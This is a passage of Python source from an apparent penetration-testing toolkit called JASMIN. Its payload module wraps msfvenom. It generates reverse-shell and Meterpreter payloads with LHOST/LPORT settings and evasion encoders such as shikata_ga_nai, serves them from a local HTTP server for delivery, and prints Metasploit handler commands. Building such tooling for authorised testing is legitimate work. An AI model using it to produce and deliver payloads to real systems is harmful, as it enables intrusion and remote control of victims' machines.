        # Advanced options section
        options += f"\n[*] Advanced options:\n\n"
        options += f"   {'Name':<15} {'Current Setting':<20} {'Required':<10} {'Description'}\n"
        options += f"   {'='*15} {'='*20} {'='*10} {'='*30}\n"
        
        options += f"   {'Format':<15} {str(self.config.format or 'exe'):<20} {'yes':<10} {'Output format'}\n"
        options += f"   {'Architecture':<15} {str(self.config.arch or 'auto'):<20} {'no':<10} {'Target architecture'}\n"
        options += f"   {'Platform':<15} {str(self.config.platform or 'auto'):<20} {'no':<10} {'Target platform'}\n"
        
        # Evasion options section
        options += f"\n[*] Evasion options:\n\n"
        options += f"   {'Name':<15} {'Current Setting':<20} {'Required':<10} {'Description'}\n"
        options += f"   {'='*15} {'='*20} {'='*10} {'='*30}\n"
        
        options += f"   {'Encoder':<15} {str(self.config.encoder or ''):<20} {'no':<10} {'Payload encoder'}\n"
        options += f"   {'Iterations':<15} {str(self.config.iterations):<20} {'no':<10} {'Encoding iterations'}\n"
        options += f"   {'Template':<15} {str(self.config.template or ''):<20} {'no':<10} {'Executable template'}\n"
        options += f"   {'BadChars':<15} {str(self.config.badchars or ''):<20} {'no':<10} {'Bad characters to avoid'}\n"
        
        space_limit = self.config.custom_options.get('Space', '')
        options += f"   {'Space':<15} {str(space_limit):<20} {'no':<10} {'Maximum payload size'}\n"
        
        return options
    
    def show_payloads(self, filters: List[str] = None) -> str:
        """Show available payloads with optional filtering - FROM OLD WORKING VERSION"""
        if not self.database:
            return "[!] Payload database not available"
        
        try:
            # Get all payloads from msfvenom directly if database fails
            all_payloads = []
            
            # Try database first
            if hasattr(self.database, 'categories') and self.database.categories:
                for category in self.database.categories.values():
                    if 'payloads' in category:
                        all_payloads.extend(category['payloads'])
            
            # Fallback: get from msfvenom directly if database is empty
            if not all_payloads and hasattr(self.database, 'msfvenom'):
                try:
                    result = subprocess.run(['msfvenom', '-l', 'payloads'], 
                                        capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        # Parse msfvenom output
                        lines = result.stdout.split('\n')
                        in_payload_section = False
                        for line in lines:
                            if 'Name' in line and 'Description' in line:
                                in_payload_section = True
                                continue
                            if in_payload_section and line.strip():
                                parts = line.split(None, 1)
                                if len(parts) >= 1:
                                    all_payloads.append({
                                        'name': parts[0], 
                                        'description': parts[1] if len(parts) > 1 else ''
                                    })
                except Exception:
                    pass
            
            # Apply filters if provided
            if filters:
                filtered_payloads = []
                for payload in all_payloads:
                    name = payload['name'].lower()
                    if any(f.lower() in name for f in filters):
                        filtered_payloads.append(payload)
                payloads = filtered_payloads
            else:
                payloads = all_payloads
            
            # Display results
            result = f"\n[*] Available payloads"
            if filters:
                result += f" (filtered by: {', '.join(filters)})"
            result += f" ({len(payloads)} total):\n\n"
            
            for i, payload in enumerate(payloads[:30], 1):  # Show up to 30
                result += f"   {i:2d}. {payload['name']}\n"
                if payload.get('description'):
                    desc = payload['description'][:50] + "..." if len(payload['description']) > 50 else payload['description']
                    result += f"       {desc}\n"
            
            if len(payloads) > 30:
                result += f"\n   ... and {len(payloads) - 30} more (use filters to narrow results)\n"
            
            result += "\n[*] Use 'use <number>' to select a payload"
            self.search_results = payloads  # Store for selection
            return result
            
        except Exception as e:
            return f"[!] Error loading payloads: {str(e)}"

    def show_encoders(self) -> str:
        """Show available encoders - FROM OLD WORKING VERSION"""
        return """
    [*] Compatible Encoders:

    Name                          Rank     Description
    ----                          ----     -----------
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x64/xor                       normal     XOR Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder  
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x64/zutto_dekiru              normal     Zutto Dekiru
    x86/countdown                 low        Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               low        Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/unicode_mixed             low        Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             low        Alpha2 Alphanumeric Unicode Uppercase Encoder

    [*] Use 'set encoder <name>' to select an encoder
    [*] Use 'set iterations <number>' to set encoding iterations (default: 1)
    """

    def show_formats(self) -> str:
        """Show available output formats - FROM OLD WORKING VERSION"""
        return """
    [*] Payload formats (--format <value>):

    asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, 
    exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, 
    psh, psh-net, psh-reflection, python-reverse-shell, raw, ruby, vba, vba-exe, 
    vba-psh, vbs, war

    [*] Use 'set format <format>' to select an output format

    [*] Popular formats:
    exe              - Windows executable
    elf              - Linux executable  
    raw              - Raw shellcode
    python           - Python script
    powershell       - PowerShell script
    c                - C source code
    jsp              - Java Server Page
    war              - Web Application Archive
    """

    def set_option(self, option: str, value: str) -> str:
        """Set configuration option - FROM OLD WORKING VERSION"""
        option_lower = option.lower()
        
        try:
            if option_lower in ['payload_type', 'payload']:
                self.config.payload_type = value
                # Update prompt when payload changes
                self.prompt = f"\033[94m[payload({self._get_short_name()})]\033[0m >> "
                return f"[*] payload_type => {value}"
                
            elif option_lower == 'lhost':
                self.config.lhost = value
                return f"[*] LHOST => {value}"
                
            elif option_lower == 'lport':
                try:
                    port = int(value)
                    if 1 <= port <= 65535:
                        self.config.lport = port
                        return f"[*] LPORT => {port}"
                    else:
                        return "[!] Invalid port range. Use 1-65535"
                except ValueError:
                    return "[!] Invalid port number"
                    
            elif option_lower == 'format':
                self.config.format = value
                return f"[*] format => {value}"
                
            elif option_lower == 'encoder':
                self.config.encoder = value
                return f"[*] encoder => {value}"
                
            elif option_lower == 'arch':
                if value.lower() in ['x86', 'x64', 'x86_64']:
                    self.config.arch = value.lower()
                    return f"[*] arch => {value.lower()}"
                else:
                    return "[!] Invalid architecture. Use x86, x64, or x86_64"
                    
            elif option_lower == 'iterations':
                try:
                    iterations = int(value)
                    if iterations >= 1:
                        self.config.iterations = iterations
                        return f"[*] iterations => {iterations}"
                    else:
                        return "[!] Iterations must be >= 1"
                except ValueError:
                    return "[!] Invalid number for iterations"
                    
            elif option_lower == 'template':
                self.config.template = value
                return f"[*] template => {value}"
                
            elif option_lower == 'badchars':
                self.config.badchars = value
                return f"[*] badchars => {value}"
                
            else:
                # Store as custom option
                self.config.custom_options[option] = value
                return f"[*] {option} => {value}"
                
        except Exception as e:
            return f"[!] Error setting {option}: {str(e)}"

    def use_payload(self, payload_input: str) -> str:
        """Use/select a payload by name or number - FROM OLD WORKING VERSION"""
        try:
            # Check if it's a number (from search results)
            if payload_input.isdigit():
                return self.select_from_search(int(payload_input))
            
            # Otherwise treat as payload name
            payload_name = payload_input.strip()
            
            # Set the payload
            self.config.payload_type = payload_name
            
            # Auto-set platform and arch if available
            if '/' in payload_name:
                self.config.platform = payload_name.split('/')[0]
            if 'x64' in payload_name:
                self.config.arch = 'x64'
            elif 'x86' in payload_name:
                self.config.arch = 'x86'
            
            self.prompt = f"\033[94m[payload({self._get_short_name()})]\033[0m >> "
            return f"[*] Using payload: {payload_name}\n[*] Use 'show options' to configure"
                
        except Exception as e:
            return f"[!] Error selecting payload: {str(e)}"

    def search_payloads(self, search_term: str) -> str:
        """Search for payloads matching the term - FROM OLD WORKING VERSION"""
        try:
            search_term = search_term.lower().strip()
            if not search_term:
                return "[!] Please provide a search term"
            
            # Get payloads from msfvenom directly for most accurate results
            results = []
            try:
                result = subprocess.run(['msfvenom', '-l', 'payloads'], 
                                    capture_output=True, text=True, timeout=15)
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    in_payload_section = False
                    for line in lines:
                        if 'Name' in line and 'Description' in line:
                            in_payload_section = True
                            continue
                        if in_payload_section and line.strip():
                            parts = line.split(None, 1)
                            if len(parts) >= 1:
                                name = parts[0]
                                desc = parts[1] if len(parts) > 1 else ''
                                
                                # Check for match
                                if search_term in name.lower() or search_term in desc.lower():
                                    results.append({'name': name, 'description': desc})
            except Exception:
                return "[!] Error accessing msfvenom. Make sure it's installed and in PATH"
            
            if not results:
                return f"[!] No payloads found matching '{search_term}'"
            
            # Display results
            output = f"\n[*] Search results for '{search_term}' ({len(results)} found):\n\n"
            for i, payload in enumerate(results[:20], 1):  # Limit to 20 results
                output += f"   {i:2d}. {payload['name']}\n"
                if payload.get('description'):
                    desc = payload['description'][:50] + "..." if len(payload['description']) > 50 else payload['description']
                    output += f"       {desc}\n"
            
            if len(results) > 20:
                output += f"\n   ... and {len(results) - 20} more (refine search to see more)\n"
            
            output += "\n[*] Use 'use <number>' to select a payload from search results"
            self.search_results = results  # Store for selection
            return output
            
        except Exception as e:
            return f"[!] Search error: {str(e)}"

    def select_from_search(self, number: int) -> str:
        """Select a payload from search results by number - FROM OLD WORKING VERSION"""
        if not hasattr(self, 'search_results') or not self.search_results:
            return "[!] No search results available. Use 'search <term>' first"
        
        if not (1 <= number <= len(self.search_results)):
            return f"[!] Invalid selection. Choose 1-{len(self.search_results)}"
        
        try:
            selected_payload = self.search_results[number - 1]
            payload_name = selected_payload['name']
            
            self.config.payload_type = payload_name
            # Auto-set platform and arch
            if '/' in payload_name:
                self.config.platform = payload_name.split('/')[0]
            if 'x64' in payload_name:
                self.config.arch = 'x64'
            elif 'x86' in payload_name:
                self.config.arch = 'x86'
            
            self.prompt = f"\033[94m[payload({self._get_short_name()})]\033[0m >> "
            return f"[*] Selected payload: {payload_name}\n[*] Use 'show options' to configure"
            
        except Exception as e:
            return f"[!] Error selecting payload: {str(e)}"

    def show_help(self) -> str:
        """Show build mode help - FROM OLD WORKING VERSION"""
        return """
    [*] JASMIN Build Mode Commands:

    CONFIGURATION:
    show options             Show current payload configuration
    show payloads [filter]   Browse available payloads with optional filtering
    show encoders            List available encoders
    show formats             List output formats
    set <option> <value>     Set configuration option
    
    PAYLOAD SELECTION:
    use <payload_name>       Select specific payload (e.g., windows/shell_reverse_tcp)
    use <number>             Select payload by number from search results
    search <term>            Search for payloads matching term
    <number>                 Quick select from search results
    
    GENERATION:
    generate                 Generate the configured payload
    run                      Alias for generate
    
    NAVIGATION:
    help / ?                 Show this help
    exit / quit / back       Exit build mode

    [*] Configuration Options:
    payload_type             Set the payload (e.g., windows/shell_reverse_tcp)
    LHOST                   Set listener IP address
    LPORT                   Set listener port
    format                  Set output format (exe, elf, raw, etc.)
    encoder                 Set encoder (e.g., x86/shikata_ga_nai)
    arch                    Set architecture (x86, x64)
    iterations              Set encoding iterations
    template                Set template binary for injection
    badchars                Set bad characters to avoid

    [*] Example Workflow:
    search meterpreter
    use 2
    set LHOST 10.10.14.15
    set encoder x86/shikata_ga_nai
    set iterations 3
    generate
    """

    def _show_basic_options(self) -> str:
        """Show basic options when no payload is selected - FROM OLD WORKING VERSION"""
        return """
    [*] Basic Configuration:

    No payload selected. Use one of these commands to get started:
    
    search <term>            Search for payloads
    show payloads            Browse all available payloads
    use <payload_name>       Select a specific payload
    
    Example:
    search windows meterpreter
    use 1
    
    [*] Common payload types:
    windows/shell_reverse_tcp        - Windows command shell
    windows/meterpreter/reverse_tcp  - Windows Meterpreter
    linux/x86/shell_reverse_tcp      - Linux command shell
    linux/x64/meterpreter/reverse_tcp - Linux Meterpreter
    
    [*] Use 'help' for more commands
    """
    

# ============================================================================
# LAYER 5: INTEGRATION & FILE MANAGEMENT
# ============================================================================

class JasminEnvironment:
    """Interface to JASMIN environment and existing infrastructure"""
    
    def __init__(self, base_dir: str = None):
        self.base_dir = Path(base_dir) if base_dir else Path.cwd()
        self.state_file = self.base_dir / "state.json"
        self.config = self._load_jasmin_config()
    
    def _load_jasmin_config(self) -> Dict:
        return {
            'target_name': self._get_current_target(),
            'target_dir': self.base_dir / "target",
            'upload_dir': Path.home() / "Tools",
            'default_lhost': None
        }
    
    def _get_current_target(self) -> Optional[str]:
        try:
            if self.state_file.exists():
                with open(self.state_file) as f:
                    state = json.load(f)
                    return state.get('target_name', 'payload')
        except:
            pass
        return 'payload'
    
    def get_target_dir(self) -> Path:
        target_dir = self.config['target_dir']
        if not target_dir.exists():
            target_dir.mkdir(parents=True)
        return target_dir
    
    def get_payloads_dir(self) -> Path:
        payloads_dir = self.get_target_dir() / "payloads"
        if not payloads_dir.exists():
            payloads_dir.mkdir(parents=True)
        return payloads_dir
    
    def get_upload_dir(self) -> Path:
        upload_dir = Path(self.config['upload_dir'])
        if not upload_dir.exists():
            upload_dir.mkdir(parents=True)
        return upload_dir


class PayloadFileManager:
    """Handles file operations and integration with JASMIN infrastructure"""
    
    def __init__(self, jasmin_env: JasminEnvironment):
        self.jasmin_env = jasmin_env
    
    def save_payload(self, config: PayloadConfig, payload_data: bytes) -> Tuple[bool, str, Optional[Path]]:
        try:
            target_name = self.jasmin_env.config['target_name']
            filename = config.get_smart_filename(target_name)
            payloads_dir = self.jasmin_env.get_payloads_dir()
            filepath = payloads_dir / filename
            
            with open(filepath, 'wb') as f:
                f.write(payload_data)
            
            self._update_state_tracking(config, filepath)
            return True, f"Payload saved to {filepath}", filepath
        except Exception as e:
            return False, f"Failed to save payload: {str(e)}", None
    
    def handle_upload_flag(self, filepath: Path, start_server: bool = False) -> Tuple[bool, str]:
        try:
            upload_dir = self.jasmin_env.get_upload_dir()
            upload_path = upload_dir / filepath.name
            shutil.copy2(filepath, upload_path)
            
            message = f"Payload copied to upload directory: {upload_path}"
            if start_server:
                server_status = self._start_upload_server()
                message += f"\n{server_status}"
            
            return True, message
        except Exception as e:
            return False, f"Failed to handle upload: {str(e)}"
    
    def _start_upload_server(self) -> str:
        try:
            if self._is_upload_server_running():
                return "Upload server already running on port 8080"
            
            # Start server in background (simplified)
            import subprocess
            subprocess.Popen(['python3', '-m', 'http.server', '8080'], 
                           cwd=self.jasmin_env.get_upload_dir(),
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL)
            time.sleep(1)  # Give server time to start
            return "Upload server started on port 8080"
        except Exception as e:
            return f"Failed to start upload server: {str(e)}"
    
    def _is_upload_server_running(self) -> bool:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(('127.0.0.1', 8080))
                return True
        except:
            return False
    
    def _update_state_tracking(self, config: PayloadConfig, filepath: Path):
        try:
            state_file = self.jasmin_env.state_file
            state = {}
            if state_file.exists():
                with open(state_file) as f:
                    state = json.load(f)
            
            if 'payloads' not in state:
                state['payloads'] = []
            
            payload_entry = {
                'filename': filepath.name,
                'filepath': str(filepath),
                'payload_type': config.payload_type,
                'lhost': config.lhost,
                'lport': config.lport,
                'format': config.format,
                'created': config.created_timestamp,
                'description': config.description
            }
            state['payloads'].append(payload_entry)
            
            with open(state_file, 'w') as f:
                json.dump(state, f, indent=2)
        except Exception as e:
            print(f"Warning: Failed to update state tracking: {e}")


# ============================================================================
# MAIN PAYLOAD MANAGER - HIGH-LEVEL ORCHESTRATION
# ============================================================================

class PayloadManager:
    """Main orchestration class for JASMIN payload commands"""
    
    def __init__(self, jasmin_env: JasminEnvironment = None):
        self.jasmin_env = jasmin_env or JasminEnvironment()
        self.parser = CommandParser()
        self.msfvenom = MsfvenomWrapper()
        self.network = NetworkDetection()
        self.database = PayloadDatabase(self.msfvenom)
        self.selection_engine = SelectionEngine(self.database)
        self.file_manager = PayloadFileManager(self.jasmin_env)
        
        # UI components
        self.preview_interface = PreviewInterface()
        self.browse_interface = BrowseInterface(self.database)
        self.build_interface = None
        
        # State management
        self.current_mode = "command"
        self.current_config = None
        self.browse_state = {"category": "root", "items": []}
        self.search_results = []
    
    def handle_command(self, command: str) -> str:
        """Main entry point for payload commands"""
        try:
            # Handle build mode commands
            if self.current_mode == "build" and self.build_interface:
                if self.build_interface.active:
                    result = self.build_interface.handle_command(command)
                    if not self.build_interface.active:
                        if "Generating" in result:
                            generate_result = self._generate_current_config()
                            return result + "\n" + generate_result
                        else:
                            self.current_mode = "command"
                            self.build_interface = None
                    return result
                else:
                    self.current_mode = "command"
                    self.build_interface = None
            
            # Handle browse mode selections
            if self.current_mode == "browse":
                return self._handle_browse_input(command)
            
            # Handle search selections (s2, sg2, sb2)
            command_lower = command.strip().lower()
            if hasattr(self, 'search_results') and len(command_lower) > 1 and command_lower[0] == 's':
                return self._handle_search_selection(command_lower)
            
            # Parse new payload command
            tokens = command.split()
            intent = self.parser.parse_payload_command(tokens)
            
            if intent.command_type == CommandType.QUICK_GENERATE:
                return self._handle_quick_generate(intent)
            elif intent.command_type == CommandType.BUILD_MODE:
                return self._handle_build_mode(intent)
            elif intent.command_type == CommandType.BROWSE:
                return self._handle_browse(intent)
            elif intent.command_type == CommandType.SEARCH:
                return self._handle_search(intent)
            elif intent.command_type == CommandType.HELP:
                return self._show_help()
            else:
                return "[!] Command type not implemented"
                
        except Exception as e:
            return f"[!] Error: {str(e)}"
    
    def _handle_quick_generate(self, intent: PayloadIntent) -> str:
        """Handle Tier 1 quick generation commands"""
        config = self.selection_engine.quick_select(intent)
        
        # Auto-configure network settings
        if not config.lhost:
            config.lhost = self.network.get_lhost()
        if not config.lport:
            protocol = intent.protocol or 'tcp'
            config.lport = self.network.suggest_port_by_protocol(protocol)
        
        # Set target name
        config.target_name = self.jasmin_env.config['target_name']
        
        # Check for immediate upload
        if intent.flags.get('upload'):
            return self._generate_and_upload(config)
        
        # Show preview and store config for potential generation
        self.current_config = config
        preview = self.preview_interface.show_preview(config, config.target_name)
        prompt = self.preview_interface.prompt_action()
        
        return preview + prompt
    
    def _handle_build_mode(self, intent: PayloadIntent) -> str:
        """Handle Tier 3 build mode commands"""
        # Start with quick select as template
        if intent.platform or intent.attack_type:
            config = self.selection_engine.quick_select(intent)
        else:
            config = PayloadConfig()
        
        # Auto-configure basics
        if not config.lhost:
            config.lhost = self.network.get_lhost()
        if not config.lport:
            config.lport = 4444
        
        config.target_name = self.jasmin_env.config['target_name']
        
        # Enter build mode
        self.current_mode = "build"
        self.current_config = config
        self.build_interface = BuildModeInterface(config, self.database)
        
        welcome_msg = """
[*] JASMIN Advanced Payload Builder
[*] Enter Metasploit-style configuration mode
[*] Type 'help' for commands or 'show payloads' to browse available payloads
"""
        
        if config.payload_type:
            welcome_msg += f"[*] Template loaded: {config.payload_type}\n"
        
        return welcome_msg + self.build_interface.show_options()
    
    def _handle_browse(self, intent: PayloadIntent) -> str:
        """Handle Tier 2 browse commands"""
        self.current_mode = "browse"
        
        if intent.platform:
            # Jump to specific platform
            items = self.selection_engine.browse_select(intent)
            if intent.exclusions:
                items = self.browse_interface.apply_filters(intent.exclusions, items)
            self.browse_state = {"category": intent.platform, "items": items}
            return self.browse_interface.show_menu(intent.platform, items, intent.exclusions)
        else:
            # Show root platforms
            platforms = list(self.database.categories.keys())
            self.browse_state = {"category": "root", "items": platforms}
            return self.browse_interface.show_menu("root", platforms)
    
    def _handle_browse_input(self, command: str) -> str:
        """Handle browse mode input with shortcuts"""
        command = command.strip().lower()
        
        # Handle exit commands
        if command in ['exit', 'quit', 'back', '0']:
            self.current_mode = "command"
            return "[*] Exiting browse mode"
        
        # Handle shortcut commands (g2, b2, etc.)
        if len(command) > 1 and command[0] in ['g', 'b']:
            try:
                selection = int(command[1:])
                if 1 <= selection <= len(self.browse_state["items"]):
                    selected_payload = self.browse_state["items"][selection - 1]
                    if isinstance(selected_payload, dict):
                        return self._handle_payload_selection_with_action(selected_payload, command[0])
                    else:
                        return "[!] Invalid selection for shortcut command"
                else:
                    return f"[!] Invalid selection: {selection}. Choose 1-{len(self.browse_state['items'])}"
            except ValueError:
                return f"[!] Invalid shortcut command: {command}"
        
        # Handle regular numeric selection
        try:
            selection = int(command)
            category, items = self.browse_interface.drill_down(selection, self.browse_state["items"])
            
            if category == "root":
                self.current_mode = "command"
                return "[*] Exiting browse mode"
            elif category == "selected":
                # User selected a payload
                selected_payload = items[0]
                return self._handle_payload_selection(selected_payload)
            else:
                # Update browse state
                self.browse_state = {"category": category, "items": items}
                return self.browse_interface.show_menu(category, items)
                
        except ValueError:
            return "[!] Invalid selection. Enter a number, shortcut (g2, b2), or 'exit'."
    
    def _handle_payload_selection(self, payload: Dict[str, str]) -> str:
        """Handle payload selection from browse mode"""
        config = PayloadConfig()
        config.payload_type = payload['name']
        config.target_name = self.jasmin_env.config['target_name']
        
        # Auto-configure
        if not config.lhost:
            config.lhost = self.network.get_lhost()
        if not config.lport:
            config.lport = 4444
        
        # Apply smart defaults
        if config.platform:
            defaults = self.selection_engine.mapper.get_smart_defaults(config.platform)
            if defaults.get('format'):
                config.format = defaults['format']
        
        self.current_config = config
        self.current_mode = "command"
        
        preview = self.preview_interface.show_preview(config, config.target_name)
        prompt = self.preview_interface.prompt_action()
        return f"[*] Selected: {payload['name']}\n" + preview + prompt
    
    def _handle_payload_selection_with_action(self, payload: Dict[str, str], action: str) -> str:
        """Handle payload selection with immediate action"""
        config = PayloadConfig()
        config.payload_type = payload['name']
        config.target_name = self.jasmin_env.config['target_name']
        
        # Auto-configure
        if not config.lhost:
            config.lhost = self.network.get_lhost()
        if not config.lport:
            config.lport = 4444
        
        # Apply smart defaults
        if config.platform:
            defaults = self.selection_engine.mapper.get_smart_defaults(config.platform)
            if defaults.get('format'):
                config.format = defaults['format']
        
        self.current_config = config
        self.current_mode = "command"
        
        if action == 'g':
            # Generate immediately
            return f"[*] Selected: {payload['name']}\n" + self._generate_payload(config)
        elif action == 'b':
            # Enter build mode
            return f"[*] Selected: {payload['name']}\n" + self._enter_build_mode_with_config(config)
        
        return f"[!] Unknown action: {action}"
    
    def _handle_search(self, intent: PayloadIntent) -> str:
        """Handle Tier 2 search commands"""
        results = self.selection_engine.search_select(intent)
        
        if not results:
            return "[!] No payloads found matching your search criteria"
        
        # Store search results for selection
        self.search_results = results[:20]  # Store first 20 for selection
        
        output = f"[*] Found {len(results)} payloads:\n"
        for i, payload in enumerate(self.search_results, 1):
            output += f"    {i:2d}. {payload['name']}\n"
            if payload.get('description'):
                desc = payload['description'][:60]
                output += f"        {desc}\n"
        
        if len(results) > 20:
            output += f"\n[*] Showing first 20 of {len(results)} results. Refine search for more specific results.\n"
        
        # Add selection instructions
        output += f"\n[*] Selection Options:"
        output += f"\n    s<number>    Select payload and configure (e.g., s2)"
        output += f"\n    sg<number>   Select and generate immediately (e.g., sg2)"
        output += f"\n    sb<number>   Select and enter build mode (e.g., sb2)"
        output += f"\n\nUse search selection commands above, or run a new command."
        
        return output
    
    def _generate_current_config(self) -> str:
        """Generate payload using current configuration"""
        if not self.current_config:
            return "[!] No configuration available"
        
        # Use build interface config if in build mode
        if self.build_interface:
            config = self.build_interface.config
        else:
            config = self.current_config
        
        return self._generate_payload(config)
    
    def _generate_payload(self, config: PayloadConfig) -> str:
        """Generate payload using provided configuration"""
        success, message, payload_data = self.msfvenom.execute_command(config)
        
        if not success:
            return f"[!] Generation failed: {message}"
        
        # Save payload
        save_success, save_msg, filepath = self.file_manager.save_payload(config, payload_data)
        
        if not save_success:
            return f"[!] Save failed: {save_msg}"
        
        result = f"[+] {save_msg}"
        
        # Generate handler command
        if config.payload_type and 'reverse' in config.payload_type:
            handler_cmd = self._generate_handler_command(config)
            result += f"\n\n[*] Suggested handler command:\n{handler_cmd}"
        
        return result
    
    def _generate_and_upload(self, config: PayloadConfig) -> str:
        """Generate payload and handle upload flag"""
        generate_result = self._generate_payload(config)
        
        if "[+]" not in generate_result:
            return generate_result
        
        # Extract filepath from save message
        try:
            # Parse filepath from save message
            filepath_str = generate_result.split("Payload saved to ")[1].split("\n")[0]
            filepath = Path(filepath_str)
            
            upload_success, upload_msg = self.file_manager.handle_upload_flag(filepath, start_server=True)
            
            if upload_success:
                return generate_result + f"\n[+] {upload_msg}"
            else:
                return generate_result + f"\n[!] Upload failed: {upload_msg}"
        except Exception as e:
            return generate_result + f"\n[!] Upload processing failed: {str(e)}"
    
    def _generate_handler_command(self, config: PayloadConfig) -> str:
        """Generate Metasploit handler command"""
        handler = []
        handler.append("use exploit/multi/handler")
        handler.append(f"set PAYLOAD {config.payload_type}")
        if config.lhost:
            handler.append(f"set LHOST {config.lhost}")
        if config.lport:
            handler.append(f"set LPORT {config.lport}")
        handler.append("run")
        return "\n".join(handler)
    
    def _show_help(self) -> str:
        """Show comprehensive help with enhanced Tier 3 capabilities"""
        return """
[*] JASMIN Payload Module Help

=== TIER 1: QUICK SHORTCUTS (90% of use cases) ===
   payload windows                    # Windows reverse shell, auto LHOST/PORT
   payload linux                      # Linux reverse shell  
   payload meterpreter                # Windows meterpreter
   payload meterpreter --linux        # Linux meterpreter
   payload windows reverse            # Explicit reverse shell
   payload windows bind               # Bind shell
   payload linux http                 # HTTP reverse shell
   
   FLAGS:
   --upload                           # Auto-upload and start server
   --port 443                         # Custom port
   --format exe                       # Custom format
   --build                            # Enter build mode with template

=== TIER 2: GUIDED BROWSING & SEARCH ===
   payload browse                     # Interactive payload browsing
   payload browse windows             # Browse Windows payloads
   payload browse windows http        # Browse Windows HTTP payloads
   payload browse --exclude bind      # Browse excluding bind shells
   
   BROWSE SELECTIONS:
   <number>     Select payload and configure (e.g., 2)
   g<number>    Select and generate immediately (e.g., g2)
   b<number>    Select and enter build mode (e.g., b2)
   
   payload search dns                 # Search all payloads for "dns"
   payload search windows meterpreter # Search Windows meterpreter payloads
   payload search "*x64*reverse*"     # Wildcard search
   
   SEARCH SELECTIONS:
   s<number>    Select payload and configure (e.g., s2)
   sg<number>   Select and generate immediately (e.g., sg2)
   sb<number>   Select and enter build mode (e.g., sb2)
   
=== TIER 3: PROFESSIONAL MSF-STYLE BUILDER ===
   payload build                      # Enter advanced build mode
   payload windows build              # Build mode with Windows template
   
   BUILD MODE COMMANDS:
   show options                       # Show categorized configuration
   show payloads [filter]             # Browse payloads with filtering
   show encoders                      # List available encoders
   show formats                       # List output formats
   use <number>                       # Use payload by number
   use <payload_name>                 # Use specific payload name
   set <option> <value>              # Configure options
   generate                           # Generate payload
   help                              # Show build mode help
   exit                              # Exit build mode

=== EXAMPLES ===
   payload windows --upload --port 443
   payload browse windows
   > 2                               # Select item 2, show preview
   > g3                              # Select item 3, generate immediately
   
   payload search meterpreter
   > s2                              # Select search result 2, configure
   > sg4                             # Select search result 4, generate now
   > sb1                             # Select search result 1, build mode
   
   payload build
   > show payloads windows meterpreter # Professional browsing
   > use 2                           # Select by number
   > show encoders                   # Browse encoders
   > set encoder x86/shikata_ga_nai  # Configure encoder
   > show options                    # Review categorized config
   > generate                        # Generate final payload
   
   payload meterpreter --linux --format elf
   payload browse windows --exclude bind --exclude x86
   payload search "https" --exclude windows
"""

    def handle_confirmation(self, response: str) -> str:
        """Handle user confirmation responses"""
        response = response.lower().strip()
        
        if response in ['g', 'generate', 'yes', 'y']:
            return self._generate_current_config()
        elif response in ['c', 'configure', 'config']:
            if self.current_config:
                return self._enter_build_mode_with_config(self.current_config)
            else:
                return "[!] No configuration available"
        elif response in ['a', 'abort', 'no', 'n']:
            self.current_config = None
            return "[*] Payload generation aborted"
        else:
            return "[!] Invalid response. Please enter 'g' to generate, 'c' to configure, or 'a' to abort."
    
    def _handle_search_selection(self, command: str) -> str:
        """Handle search selection commands (s2, sg2, sb2)"""
        if not hasattr(self, 'search_results') or not self.search_results:
            return "[!] No search results available. Run a search first."
        
        # Parse search selection command
        if command.startswith('sg'):
            # sg2 - select and generate
            try:
                selection = int(command[2:])
                action = 'g'
            except ValueError:
                return f"[!] Invalid search command: {command}. Use sg<number> (e.g., sg2)"
        elif command.startswith('sb'):
            # sb2 - select and build
            try:
                selection = int(command[2:])
                action = 'b'
            except ValueError:
                return f"[!] Invalid search command: {command}. Use sb<number> (e.g., sb2)"
        elif command.startswith('s') and len(command) > 1:
            # s2 - select and configure
            try:
                selection = int(command[1:])
                action = 'c'
            except ValueError:
                return f"[!] Invalid search command: {command}. Use s<number> (e.g., s2)"
        else:
            return f"[!] Invalid search command: {command}"
        
        # Validate selection
        if not (1 <= selection <= len(self.search_results)):
            return f"[!] Invalid selection: {selection}. Choose 1-{len(self.search_results)}"
        
        # Get selected payload
        selected_payload = self.search_results[selection - 1]
        
        # Handle action
        if action == 'c':
            return self._handle_payload_selection(selected_payload)
        else:
            return self._handle_payload_selection_with_action(selected_payload, action)
    
    def _enter_build_mode_with_config(self, config: PayloadConfig) -> str:
        """Enter build mode with existing configuration"""
        self.current_mode = "build"
        self.build_interface = BuildModeInterface(config, self.database)
        
        welcome_msg = """
[*] JASMIN Advanced Payload Builder
[*] Entering build mode with selected configuration
[*] Type 'help' for commands or 'show options' to review settings
"""
        return welcome_msg + self.build_interface.show_options()


# ============================================================================
# CONVENIENCE FUNCTION FOR JASMIN INTEGRATION
# ============================================================================

def create_payload_manager(jasmin_base_dir: str = None) -> PayloadManager:
    """Convenience function to create a configured PayloadManager"""
    jasmin_env = JasminEnvironment(jasmin_base_dir)
    return PayloadManager(jasmin_env)

